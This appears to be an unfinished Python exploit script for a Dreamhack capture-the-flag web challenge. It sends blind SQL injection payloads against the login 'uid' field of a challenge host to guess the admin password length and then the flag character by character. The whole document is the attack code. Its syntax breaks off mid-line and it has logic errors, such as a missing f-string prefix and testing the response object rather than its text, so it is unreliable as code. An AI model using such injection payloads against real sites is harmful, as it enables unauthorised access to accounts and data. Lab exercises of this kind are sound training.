import requests
url = "http://host3.dreamhack.games:10732/"
for i in range(7,100):
    res = requests.get(url,data={"uid":"'(length(upw))like({i})"})
    if 'admin' in res:
        print(i)

length = i
flag = ''
for i in range(length):
    for j in range(32,127):
        res=requests.get(url,data={"uid:"'(length())})
